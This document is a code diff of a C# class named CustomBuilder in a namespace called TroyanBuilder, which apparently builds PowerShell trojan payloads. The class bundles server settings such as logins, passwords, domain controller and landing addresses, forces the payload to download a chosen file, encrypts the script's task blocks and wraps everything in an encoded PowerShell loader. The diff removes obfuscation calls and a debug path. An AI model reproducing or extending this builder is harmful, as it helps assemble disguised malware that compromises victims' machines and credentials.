@@ -1,7 +1,8 @@
-﻿using System.Diagnostics.CodeAnalysis;
+using System.Diagnostics.CodeAnalysis;
 using System.Text;
 using System.Text.Json;
 using System.Text.Json.Nodes;
+using Commons;
 using model;
 
 namespace TroyanBuilder;
@@ -10,18 +11,15 @@ namespace TroyanBuilder;
 public abstract partial class CustomBuilder
 {
     protected abstract string SourceDir {get;}
-    
+
     protected abstract string OutputFile { get; }
 
-    private string OutputFilePre => Path.ChangeExtension(OutputFile, ".pre.ps1");
-    
-    private string OutputFileNonObfuscated => Path.ChangeExtension(OutputFile, ".nonobfuscated.ps1");
-    
     protected abstract string EntryPoint { get; }
     protected abstract string[] PriorityTasks { get; }
     protected abstract string[] UnpriorityTasks { get; }
-    
-    private ServerService Svc;
+
+    private ServerModelLoader _loader = null!;
+
     protected ServerModel Model = new();
     protected PackItem? PackItem = null;
     private List<SourceFile> SourceFiles = new();
@@ -30,16 +28,14 @@ public abstract partial class CustomBuilder
     private List<SourceFile> NonDoFiles => SourceFiles
         .Where(a=> a.IsDo == false).ToList();
 
-    
+
     private readonly StringBuilder Builder = new();
     protected readonly List<string> Result = new();
-    
-    public bool IsObfuscate => (Program.ObfuscateDebug && IsDebug) || (Program.ObfuscateRelease && !IsDebug);
-    
-    public virtual List<string> Build(string server, string packId)
+
+    public virtual List<string> Build(string server, string packId, ServerModelLoader loader)
     {
-        Svc = new ServerService();
-        var srv = ServerModelLoader.LoadServer(server);
+        _loader = loader;
+        var srv = loader.LoadServer(server);
         Model = srv;
         if (!string.IsNullOrWhiteSpace(packId))
             PackItem = Model.Pack.Items.FirstOrDefault(a=> a.Id == packId);
@@ -50,21 +46,11 @@ public abstract partial class CustomBuilder
         var directoryPath = Path.GetDirectoryName(OutputFile);
         if (!string.IsNullOrEmpty(directoryPath) && !Directory.Exists(directoryPath))
             Directory.CreateDirectory(directoryPath);
-        
+
         Build();
-        
-        File.Copy(OutputFile, OutputFileNonObfuscated, true);
-        
-        if (IsObfuscate)
-            new PowerShellObfuscator().ObfuscateFile(OutputFile);
-        
-        File.Copy(OutputFile, OutputFilePre, true);
-        
-        if (!IsDebug)
-            GeneratePowerShellScript(OutputFile, OutputFile, true);
-      
-        if (IsObfuscate)
-            new PowerShellObfuscator().ObfuscateFile(OutputFile);
+
+        GeneratePowerShellScript(OutputFile, OutputFile, true);
+
         PostBuild();
 
         return Result;
@@ -72,7 +58,7 @@ public abstract partial class CustomBuilder
 
     protected virtual void PostBuild()
     {
-        
+
     }
 
     private void MakeConsts()
@@ -90,22 +76,22 @@ _SERVER
             "login", "password", "ico", "domainController",
             "interfaces", "bux", "landing", "php", "domainIp"
         };
-        
+
         var tempFile = Path.GetTempFileName();
         File.Copy(Model.UserServerFile, tempFile, true);
         if (PackItem != null)
         {
-            var m = ServerModelLoader.LoadServerFile(tempFile);
+            var m = _loader.LoadServerFile(tempFile);
             m.StartDownloadsForce = true;
             m.StartDownloads = new List<string>() { PackItem.OriginalUrl };
-            ServerModelLoader.SaveServerFile(tempFile, m);
+            _loader.SaveServerFile(tempFile, m);
         }
 
         var serverFilePath = tempFile;
         var serverJson = File.ReadAllText(serverFilePath);
         var server = JsonNode.Parse(serverJson)!;
 
-    
+
 
         JsonNode FilterObjectByKeywords(JsonNode serverObject, List<string> filterKeywords)
         {
@@ -123,21 +109,13 @@ _SERVER
         var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_body.ps1");
         File.WriteAllText(outputPath, template);
     }
-    
-    private bool IsDebug => GetType().Name.Contains("Debug");
+
 
     private void Build()
     {
-        if (IsDebug)
-        {
-            BuildDebug();
-        }
-        else
-        {
-            BuildRelease();
-        }
+        BuildRelease();
     }
-    
+
     private void BuildDebug()
     {
         foreach (var x in NonDoFiles)
@@ -156,7 +134,7 @@ _SERVER
             var doX = $"do_{sourceFile.Name}";
             Builder.AppendLine(doX);
         }
-        
+
         File.WriteAllText(OutputFile,Builder.ToString());
     }
 
@@ -164,15 +142,11 @@ _SERVER
     {
         foreach (var x in SourceFiles.Where(a=> a.Name == EntryPoint))
         {
-            if (IsObfuscate)
-                Builder.Append(new PowerShellObfuscator().RandomCode());
             Builder.Append(x.Data);
             Builder.AppendLine();
         }
-        if (IsObfuscate)
-            Builder.Append(new PowerShellObfuscator().RandomCode());
         Builder.AppendLine("");
-        
+
         var psString = new StringBuilder();
         foreach (var kvp in DoFiles)
         {
@@ -182,27 +156,25 @@ _SERVER
             var renamedKey = key;
             if (Program.RandomDo)
             {
-                renamedKey =  PowerShellObfuscator.GenerateRandomName();
+                renamedKey = kvp.Name;
                 renamed.Add(kvp.Name, renamedKey);
             }
-            
+
             psString.AppendLine($"    \"{renamedKey}\" = \"{kvp.CryptedData(renamed)}\"");
         }
 
         var doo = psString.ToString();
-        
+
         var dataProd = Builder.ToString();
         var programRaw = ReadSource("program");
         (var head, var body) = ExtractHeadAndBody(programRaw.Data);
         body = body.Replace("###doo", doo);
         dataProd = head + Environment.NewLine + dataProd + Environment.NewLine + body;
-        if (IsObfuscate)
-            dataProd = new PowerShellObfuscator().Obfuscate(dataProd);
         File.WriteAllText(OutputFile,dataProd);
     }
 
     protected abstract void InternalBuild(string server);
-    
+
     private void CompileSources()
     {
         for (var i = 0; i < SourceFiles.Count; i++)
@@ -212,12 +184,12 @@ _SERVER
             SourceFiles[i] = sourceFile;
         }
     }
-    
+
     protected string PfxFile(string domain)
     {
         return Path.Combine(Model.CertDir, domain + ".pfx");
     }
-    
+
     static (string Head, string Body) ExtractHeadAndBody(string input)
     {
         var lines = input.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
@@ -257,13 +229,11 @@ _SERVER
 
         return (head.ToString().Trim(), body.ToString().Trim());
     }
-    
+
     public string GeneratePowerShellScript(string powerShellCode, bool attachEncoded)
     {
         var encoded = CustomCryptor.Encode(powerShellCode);
         var script = ReadSource("dynamic").Data;
-        if (IsObfuscate)
-            script = new PowerShellObfuscator().Obfuscate(script);
         if (!attachEncoded)
             return script;
         var data = $"$EncodedScript = \"{encoded}\"" + Environment.NewLine + script;
